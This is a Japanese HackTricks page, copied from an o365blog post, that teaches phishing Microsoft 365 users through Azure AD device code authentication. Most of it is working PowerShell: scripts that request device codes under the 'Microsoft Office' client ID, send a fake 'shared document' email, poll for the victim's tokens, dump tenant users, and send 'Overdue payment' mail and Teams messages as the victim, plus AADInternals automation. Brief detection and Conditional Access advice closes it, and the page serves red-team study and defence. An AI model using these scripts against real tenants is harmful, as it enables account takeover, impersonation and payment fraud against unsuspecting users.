# Az - デバイスコード認証フィッシング

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

**この投稿は** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/) **からコピーされました**

### デバイスコード認証とは <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Microsoftの[ドキュメント](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)によると、デバイスコード認証は以下のように説明されています:

> スマートTV、IoTデバイス、プリンターなどの入力制約のあるデバイスでユーザーがサインインできるようにします。このフローを有効にするために、デバイスはユーザーに別のデバイスのブラウザでウェブページを訪問してサインインするように促します。ユーザーがサインインすると、デバイスは必要に応じてアクセストークンとリフレッシュトークンを取得できます。

プロセスは以下の通りです:

1. ユーザーがデバイスコードフローをサポートするアプリをデバイスで起動します
2. アプリはAzure ADの/devicecodeエンドポイントに接続し、**client\_id** と **resource** を送信します
3. Azure ADは **device\_code**、**user\_code**、**verification\_url** を返送します
4. デバイスはユーザーに **verification\_url** (hxxps://microsoft.com/devicelogin) と **user\_code** を表示します
5. ユーザーはブラウザを開き、**verification\_url** にアクセスし、求められたら **user\_code** を入力してログインします
6. デバイスはAzure ADに対してポーリングを行い、成功したログイン後に **access\_token** と **refresh\_token** を取得します

![デバイスコードフロー](https://o365blog.com/images/posts/phishing\_5.png)

### デバイスコード認証を利用したフィッシング <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

デバイスコード認証をフィッシングに利用する基本的なアイデアは以下の通りです。

1. 攻撃者は/devicecodeエンドポイントに接続し、**client\_id** と **resource** を送信します
2. **verification\_uri** と **user\_code** を受け取った後、それらを含むメールを作成し、被害者に送信します
3. 被害者はリンクをクリックし、コードを提供してサインインを完了します
4. 攻撃者は **access\_token** と **refresh\_token** を受け取り、被害者を模倣することができます

#### 1. /devicecodeエンドポイントへの接続 <a href="#1-connecting-to-devicecode-endpoint" id="1-connecting-to-devicecode-endpoint"></a>

最初のステップは、Azure ADのdevicecodeエンドポイントに対してhttp POSTを行うことです：
```
https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0
```
以下のパラメータを使用しています。最も正当なアプリ名に見える「Microsoft Office」のclient\_idを選択しました。これは他のリソースにもアクセスできます。選択されたリソースはAAD Graph APIにアクセスを提供し、これはMSOnline PowerShellモジュールによって使用されます。

| パラメータ  | 値                                                      |
| ------------ | ------------------------------------------------------- |
| client\_id   | d3590ed6-52b3-4102-aeff-aad2292ab01c                    |
| resource     | [https://graph.windows.net](https://graph.windows.net/) |

応答は以下のようなものです：
```json
{
"user_code": "CLZ8HAV2L",
"device_code": "CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t_ZM2B0cgcjQgAA",
"verification_url": "https://microsoft.com/devicelogin",
"expires_in": "900",
"interval": "5",
"message": "To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code CLZ8HAV2L to authenticate."
}
```
| パラメータ         | 説明                                                                 |
| ----------------- | --------------------------------------------------------------------------- |
| user\_code        | ユーザーが要求された際に入力するコード                                   |
| device\_code      | 認証結果を“ポーリング”するために使用されるデバイスコード                    |
| verification\_url | ユーザーが認証のためにブラウズする必要があるURL                         |
| expires\_in       | 有効期限（秒）（15分）                                 |
| interval          | クライアントが認証のためにポーリングすべき頻度（秒） |
| message           | ユーザーに表示される事前にフォーマットされたメッセージ                            |

deviceloginエンドポイントに接続するためのスクリプトはこちらです：
```powershell
# Create a body, we'll be using client id of "Microsoft Office"

$body=@{
"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"resource" =  "https://graph.windows.net"
}

# Invoke the request to get device and user codes

$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code
```
**注意！** 私はバージョン1.0を使用していますが、これは[ドキュメント](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code)で使用されているv2.0フローと少し異なります。

#### 2. フィッシングメールの作成 <a href="#2-creating-a-phishing-email" id="2-creating-a-phishing-email"></a>

**verification\_url**（常に同じ）と**user\_code**を取得したので、フィッシングメールを作成して送信することができます。

**注意！** メールを送信するには、機能するsmtpサービスが必要です。

以下は、被害者にフィッシングメールを送信するためのスクリプトです：
```powershell
# Create a message

$message = @"
<html>
Hi!<br>
Here is the link to the <a href="https://microsoft.com/devicelogin">document</a>. Use the following code to access: <b>$user_code</b>. <br><br>
</html>
"@

# Send the email

Send-MailMessage -from "Don Director <dond@something.com>" -to "william.victim@target.org" -Subject "Don shared a document with you" -Body $message -SmtpServer $SMTPServer -BodyAsHtml
```
受信したメールは以下のように見えます： ![Device Code flow](https://o365blog.com/images/posts/phishing\_6.png)

#### 3. 「魚を捕まえる」 - 被害者が認証を行う <a href="#3-catching-the-fish-victim-performs-the-authentication" id="3-catching-the-fish-victim-performs-the-authentication"></a>

被害者がリンクをクリックすると、次のサイトが表示されます。URLは正規のMicrosoftのURLであることがわかります。ユーザーには、メールからコードを入力するように求められます。

![Device code](https://o365blog.com/images/posts/phishing\_7.png)

コードを入力した後、ユーザーはサインインするユーザーを選択するように求められます。**Microsoft Office**にサインインするように求められていることがわかりますが、同意は求められていません。

**注意！** ユーザーがログインしていない場合、対象組織が使用している方法を使用してログインする必要があります。

![Login](https://o365blog.com/images/posts/phishing\_8.png)

成功した認証の後、ユーザーには以下が表示されます。

![Profit](https://o365blog.com/images/posts/phishing\_9.png)

:warning: **この時点でユーザーの身元が危険にさらされています！** :warning:

#### 4. アクセストークンの取得 <a href="#4-retrieving-the-access-tokens" id="4-retrieving-the-access-tokens"></a>

攻撃者にとっての最後のステップは、アクセストークンを取得することです。ステップ2を完了した後、攻撃者は認証状態をポーリングするためにAzure ADに問い合わせを開始します。

攻撃者は、5秒ごとにAzure ADトークンエンドポイントにhttp POSTを行う必要があります：
```
https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0
```
リクエストには以下のパラメータが含まれている必要があります（codeはステップ1からのdevice\_codeです）

| パラメータ   | 値                                                                                                                                                                                                            |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| client\_id  | d3590ed6-52b3-4102-aeff-aad2292ab01c                                                                                                                                                                             |
| resource    | [https://graph.windows.net](https://graph.windows.net/)                                                                                                                                                          |
| code        | CAQABAAEAAAB2UyzwtQEKR7-rWbgdcBZIGm0IlLxBn23EWIrgw7fkNIKyMdS2xoEg9QAntABbI5ILrinFM2ze8dVKdixlThVWfM8ZPhq9p7uN8tYIuMkfVJ29aUnUBTFsYCmJCsZHkIxtmwdCsIlKpOQij2lJZzphfZX8j0nktDpaHVB0zm-vqATogllBjA-t\_ZM2B0cgcjQgAA |
| grant\_type | urn:ietf:params:oauth:grant-type:device\_code                                                                                                                                                                    |

認証が保留中の場合、以下の内容を含むhttpエラー **400 Bad Request** が返されます：
```json
{
"error": "authorization_pending",
"error_description": "AADSTS70016: OAuth 2.0 device flow error. Authorization is pending. Continue polling.\r\nTrace ID: b35f261e-93cd-473b-9cf9-b81f30800600\r\nCorrelation ID: 8ee0ae8a-533f-4742-8334-e9ed939b083d\r\nTimestamp: 2020-10-14 06:06:07Z",
"error_codes": [70016],
"timestamp": "2020-10-13 18:06:07Z",
"trace_id": "b35f261e-93cd-473b-9cf9-b81f30800600",
"correlation_id": "8ee0ae8a-533f-4742-8334-e9ed939b083d",
"error_uri": "https://login.microsoftonline.com/error?code=70016"
}
```
成功したログイン後、以下のようなレスポンスを受け取ります（トークンは省略）：
```json
{
"token_type": "Bearer",
"scope": "user_impersonation",
"expires_in": "7199",
"ext_expires_in": "7199",
"expires_on": "1602662787",
"not_before": "1602655287",
"resource": "https://graph.windows.net",
"access_token": "eyJ0eXAi...HQOT1rvUEOEHLeQ",
"refresh_token": "0.AAAAxkwD...WxPoK0Iq6W",
"foci": "1",
"id_token": "eyJ0eXAi...widmVyIjoiMS4wIn0."
}
```
以下のスクリプトは、Azure AD トークンエンドポイントに接続し、認証ステータスをポーリングします。
```powershell
$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
"code" =       $authResponse.device_code
"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
Start-Sleep -Seconds $interval
$total += $interval

if($total -gt $expires)
{
Write-Error "Timeout occurred"
return
}

# Try to get the response. Will give 40x while pending so we need to try&catch

try
{
$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
}
catch
{
# This is normal flow, always returns 40x unless successful

$details=$_.ErrorDetails.Message | ConvertFrom-Json
$continue = $details.error -eq "authorization_pending"
Write-Host $details.error

if(!$continue)
{
# Not pending so this is a real error

Write-Error $details.error_description
return
}
}

# If we got response, all okay!

if($response)
{
break # Exit the loop

}
}
```
次に、アクセストークンを使用して被害者になりすますことができます：
```powershell
# Dump the tenant users to csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```
We can also get access tokens to other services using the refresh token as long as the `client_id` remains the same.

次のスクリプトはExchange Onlineのためのアクセストークンを取得します。
```powershell
# Create body for getting access token for Exchange Online

$body=@{
"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
"grant_type" =    "refresh_token"
"scope" =         "openid"
"resource" =      "https://outlook.office365.com"
"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Send email as the victim

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
## AADInternalsを使用したフィッシング <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals（v0.4.4以降）には、フィッシングプロセスを自動化する[Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing)関数があります。

フィッシングメッセージはカスタマイズ可能で、デフォルトのメッセージは以下の通りです：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/><br/>Here is a <a href="{1}">link</a> you <b>should not click</b>.<br/><br/>If you still decide to do so, provide the following code when requested: <b>{0}</b>.</div>'
```
### メール <a href="#email" id="email"></a>

次の例は、カスタマイズされたメッセージを使用してフィッシングメールを送信します。トークンはキャッシュに保存されます。
```powershell
# Create a custom message

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'

# Send a phishing email to recipients using a customised message and save the tokens to cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny shared a document with you" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
```

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
...
Received access token for william.victim@company.com
```
そして、キャッシュされたトークンを使用して、被害者としてメールを送信することができます。
```powershell
# Send email as the victim

Send-AADIntOutlookMessage -Recipient "another.wictim@target.org" -Subject "Overdue payment" -Message "Pay this <h2>asap!</h2>"
```
私たちは、支払い要求をより緊急にするために、Teamsメッセージを送ることもできます：
```powershell
# Send Teams message as the victim

Send-AADIntTeamsMessage -Recipients "another.wictim@target.org" -Message "Just sent you an email about due payment. Have a look at it."
```

```
Sent                MessageID
----                ---------
16/10/2020 14.40.23 132473328207053858
```
**以下のビデオは、AADInternalsを使用してメールフィッシングを行う方法を示しています。**

### Teams <a href="#teams" id="teams"></a>

AADInternalsは、Teamsのチャットメッセージとしてフィッシングメッセージを送信することをサポートしています。

**注意！** 被害者が「認証」され、トークンが受け取られた後、AADInternalsは元のメッセージを置き換えます。このメッセージは-CleanMessageパラメーターで提供することができます。

デフォルトのクリーンメッセージは：
```
'<div>Hi!<br/>This is a message sent to you by someone who is using <a href="https://o365blog.com/aadinternals">AADInternals</a> phishing function. <br/>If you are seeing this, <b>someone has stolen your identity!</b>.</div>'
```
```markdown
![Teams クリーンメッセージ](https://o365blog.com/images/posts/phishing_13.png)

次の例は、カスタマイズされたメッセージを使用してフィッシングメールを送信します。トークンはキャッシュに保存されます。
```
```powershell
# Get access token for Azure Core Management

Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache

# Create the custom messages

$message = '<html>Hi!<br/>Here is the link to the <a href="{1}">document</a>. Use the following code to access: <b>{0}</b>.</html>'
$cleanMessage = '<html>Hi!<br/>Have a nice weekend.</html>'

# Send a teams message to the recipient using customised messages

Invoke-AADPhishing -Recipients "wvictim@company.com" -Teams -Message $message -CleanMessage $cleanMessage -SaveToCache
```

```
Code: CKDZ2BURF
Teams message sent to: wvictim@company.com. Message id: 132473151989090816
...
Received access token for william.victim@company.com
```
**以下のビデオは、TeamsのフィッシングにAADInternalsを使用する方法を示しています。**

## 検出 <a href="#detecting" id="detecting"></a>

まず、Azure ADの観点からログインは認証が**開始された**場所で行われます。これは理解する上で非常に重要な点です。つまり、サインインログでは、ログインはユーザーのものではなく、**攻撃者の場所とデバイス**から行われたと表示されます。

しかし、リフレッシュトークンを使用して取得したアクセストークンは**サインインログに表示されません！**

以下は、Azure VM（より具体的には[cloud shell](https://o365blog.com/post/cloudshell/)）からフィッシングを開始した例です。ログを見ると、「Microsoft Office」クライアントを使用したログインが午前7時23分にIPアドレス51.144.240.233から行われたことがわかります。しかし、午前7時27分にExchange Onlineのアクセストークンを取得することはログに表示されていません。

![Azure AD サインインログ](https://o365blog.com/images/posts/phishing\_10.png)

:warning: ユーザーが通常とは異なる場所からサインインしている兆候がある場合、ユーザーアカウントが侵害されている可能性があります。

## 防止 <a href="#preventing" id="preventing"></a>

この技術を使用したフィッシングを防ぐ唯一の効果的な方法は、[Conditional Access](https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/overview)（CA）ポリシーを使用することです。具体的には、**フィッシングを防ぐことはできません**が、特定のルールに基づいて**ユーザーのサインインを防ぐ**ことができます。特に、場所とデバイスの状態に基づくポリシーはアカウントを保護するのに効果的です。これは現在使用されているすべてのフィッシング技術に適用されます。

しかし、すべてのシナリオをカバーすることは不可能です。例えば、不正な場所からのログインにMFAを強制しても、ユーザーがMFAを使用してログインしている場合は役に立ちません。

## 軽減 <a href="#mitigating" id="mitigating"></a>

ユーザーが侵害された場合、ユーザーのリフレッシュトークンは[取り消す](https://docs.microsoft.com/en-us/powershell/module/azuread/revoke-azureaduserallrefreshtoken?view=azureadps-2.0)ことができ、これにより攻撃者が侵害されたリフレッシュトークンで新しいアクセストークンを取得するのを防ぐことができます。

## 要約 <a href="#summary" id="summary"></a>

私の知る限り、デバイスコード認証フロー技術は以前にフィッシングに使用されたことはありません。

攻撃者の観点から、この方法にはいくつかの利点があります：

* アプリを登録する必要がない
* 偽のログインページなどのフィッシングインフラを設定する必要がない
* ユーザーにはサインインのみを求められる（通常は「Microsoft Office」へ） - 同意は求められない
* すべてが**login.microsoftonline.com**の名前空間で行われる
* 任意のclient\_idとリソースを使用できる（ただし、すべての組み合わせが機能するわけではない）
* ユーザーがMFAを使用してサインインした場合、アクセストークンにもMFAの主張が含まれる（これにはリフレッシュトークンを使用して取得したアクセストークンも含まれる）
* 防止にはConditional Access（およびAzure AD Premium P1/P2ライセンス）が必要

攻撃者の観点から、この方法には少なくとも1つの欠点があります：

* ユーザーコードは15分間のみ有効です

もちろん、攻撃者はフィッシングメールを複数の受信者に送ることで時間制限を最小限に抑えることができます - これにより、誰かがコードを使用してサインインする確率が高まります。

別の方法は、リンクがクリックされたときに認証を開始する[プロキシ](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)を実装することです（[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)に感謝）。ただし、この方法では、正規のmicrosoft.comのURLを使用する利点が失われます。

フィッシングキャンペーンを生き残るためのチェックリスト：

1. ユーザーに情報セキュリティとフィッシングについて**教育する** :woman\_teacher:
2. マルチファクタ認証（MFA）を使用する :iphone:
3. Intune :hammer\_and\_wrench: とConditional Access (CA) :stop\_sign: を使用する

\

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>こちら</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
